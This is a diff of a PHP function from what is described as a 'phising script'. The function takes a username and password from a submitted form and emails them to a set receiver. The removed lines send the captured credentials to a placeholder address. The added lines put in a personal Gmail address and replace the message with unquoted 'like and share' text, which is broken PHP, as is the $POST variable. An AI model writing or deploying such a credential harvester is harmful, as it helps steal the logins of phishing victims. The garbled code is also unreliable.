@@ -3,11 +3,11 @@
 		$username = $POST['username'];
 		$password = $POST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "binamshrestha12@gmail.com";
 		
-		$subject = "Got new access by phising script";
-		$message = "The username is ". $username;
-		$message .= "and password is ". $password;
+		$subject = like and share
+		$message = please open this and like and share
+		$message .= please open this and like and share
 		
 		return mail($reciever, $subject, $message);
 	}
